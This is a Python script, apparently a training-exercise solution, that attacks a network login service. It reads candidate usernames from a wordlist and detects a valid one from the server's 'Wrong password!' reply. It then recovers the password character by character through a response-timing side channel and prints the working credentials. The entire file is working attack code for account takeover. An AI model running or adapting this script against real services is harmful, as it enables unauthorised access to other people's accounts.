import socket
import sys
import os
import json
import time
from string import ascii_lowercase, ascii_uppercase, digits


def get_response_from_server(socket_from_client, serialised_request):
    encoded_request = serialised_request.encode()
    socket_from_client.send(encoded_request)
    response = client_socket.recv(1024)
    return response.decode()


def find_login(socket_from_client):
    file_path = os.path.join(os.getcwd(), "logins.txt")
    with open(file_path, mode='r') as file:
        while True:
            possible_logins = file.read().split('\n')
            for login in possible_logins:
                request = {
                    "login": login,
                    "password": ""
                }
                serialised_request = json.dumps(request)
                serialised_response = get_response_from_server(socket_from_client, serialised_request)
                response = json.loads(serialised_response)
                if response["result"] == "Wrong password!":
                    return login


def hack_account(socket_from_client):
    all_chars = ascii_lowercase + ascii_uppercase + digits
    login = find_login(socket_from_client)
    password = ""
    while True:
        for char in all_chars:
            request = {
                "login": login,
                "password": password + char
            }
            serialised_request = json.dumps(request)
            start = time.perf_counter()
            serialised_response = get_response_from_server(socket_from_client, serialised_request)
            end = time.perf_counter()
            response = json.loads(serialised_response)
            if end - start > 0.05 and response["result"] == "Wrong password!":
                password += char
                break
            if response["result"] == "Wrong password!":
                continue
            if response["result"] == "Connection success!":
                print(serialised_request)
                return


args = sys.argv
ip = args[1]
port = int(args[2])

with socket.socket() as client_socket:
    client_socket.connect((ip, port))
    hack_account(client_socket)
